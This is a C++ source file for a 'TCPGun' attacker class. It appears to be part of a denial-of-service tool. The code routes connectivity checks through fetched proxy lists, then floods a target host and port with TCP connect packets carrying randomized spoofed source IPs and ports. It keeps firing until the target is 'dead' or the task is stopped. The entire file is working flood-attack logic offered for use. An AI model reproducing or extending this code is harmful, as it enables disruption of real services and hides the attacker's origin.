#include "spdlog/spdlog.h"

#include "tcp_gun.h"

#include "api_interface.h"
#include "tcp_wrapper.h"
#include "globals.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

void TCPGun::FireTillDead(const Target &targetToKill) noexcept
{
	FireWithProxy(targetToKill);

	FireWithoutProxy(targetToKill);
}

std::optional<Target> TCPGun::Aim(const CURI &uriToAttack) noexcept
{
	TCPWrapper tcpAttacker;
	Informator informer;
	informer.LoadNewData();

	for(size_t proxyTry = 0; 
		proxyTry < AttackerConfig::TCPAttacker::PROXY_RETRIES; proxyTry++)
	{
		if(const auto proxies = informer.GetProxies())
		{
			if(auto resolvedAddress{tcpAttacker.CheckConnection(uriToAttack, *proxies)})
			{
				return *resolvedAddress;
			}
		}
		informer.LoadNewData();
	}

	return {};
}
bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
{
	// Checking connectivity over proxy, because packets would be send with randomized source
	const CURI currentTarget{targetToKill.address + ':' + std::to_string(targetToKill.port)};

	auto resolvedAddress{m_attacker.CheckConnection(currentTarget, {})};
	while(!m_currentTask.ShouldStop())
	{
		if(resolvedAddress && ShootTarget(*resolvedAddress))
		{
			resolvedAddress = m_attacker.CheckConnection(currentTarget, {});
		}
	}
	return false;
}

void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
{
	Informator informer;
	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
	{
	}

	std::optional<std::vector<Proxy>> proxies;
	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
	{
	}

	// Checking connectivity over proxy, because packets would be send with randomized source
	const std::string currentTarget
		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
	TCPWrapper tcpAttacker;
	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), *proxies)};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		SPDLOG_INFO("{} is up", resolvedAddress->address);
		ShootTarget(*resolvedAddress);
		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), *proxies);
	}
}

bool TCPGun::ShootTarget(const Target &targetToShoot)
{
	size_t count = 0;
	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
			&& !m_currentTask.ShouldStop(); count++)
	{
		Target fakeSource{GetRandomIP(), GetRandomPort()};
		TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);

		if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
			sendStatus == TCPWrapper::TCPStatus::GotError)
		{
			SPDLOG_WARN("Something went wrong durring sending packet");
			return true;
		}
	}
	SPDLOG_INFO("Already sent: {} packets, rechecking target...", count);
	return false;
}
